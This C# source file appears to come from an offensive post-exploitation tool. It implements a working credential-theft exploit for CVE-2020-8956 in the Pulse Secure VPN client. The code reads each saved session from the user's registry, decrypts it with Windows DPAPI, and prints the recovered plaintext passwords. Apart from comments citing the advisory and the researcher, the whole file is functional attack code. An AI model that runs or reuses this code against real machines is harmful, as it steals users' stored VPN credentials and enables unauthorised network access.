using Microsoft.Win32;
using System;
using System.Text;
using System.Security.Cryptography;
using System.Security.Principal;

namespace Gopher.Holes
{
	class PulseSecure
	{
		// CVE-2020-8956 - https://nvd.nist.gov/vuln/detail/CVE-2020-8956
		// Advisory - https://kb.pulsesecure.net/articles/Pulse_Security_Advisories/SA44601
		// Vulnerable Versions <= 9.1R3
		// Article - https://quentinkaiser.be/reversing/2020/10/27/pule-secure-credentials/
		// Discovery & PowerShell PoC by @QKaiser

		public static string Dig()
		{
			string findings = "";
			RegistryKey sessions = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Pulse Secure\Pulse\User Data");

			if (sessions != null)
			{
				if (sessions.SubKeyCount > 0)
				{
					findings += string.Format("\n# ---- Pulse Secure credentials for user {0} ---- #\n|\n", WindowsIdentity.GetCurrent().Name);
					var ivename = sessions.GetSubKeyNames();

					if (ivename != null && ivename.Length != 0)
					{
						foreach (var ive in ivename)
						{
							byte[] seed = Encoding.Unicode.GetBytes(ive.ToUpper());
							RegistryKey tempKey = sessions.OpenSubKey(ive);

							foreach (string valueName in tempKey.GetValueNames())
							{
								byte[] encryptedKey = (byte[])tempKey.GetValue(valueName);
								byte[] decryptedKey = ProtectedData.Unprotect(encryptedKey, seed, DataProtectionScope.CurrentUser);
								string password = Encoding.Unicode.GetString(decryptedKey);
								findings += string.Format("|   Password : {0}\n", password);
							}
						}
					}

					findings += "|\n# ---- #\n";
				}
			}

			return findings;
		}
	}
}
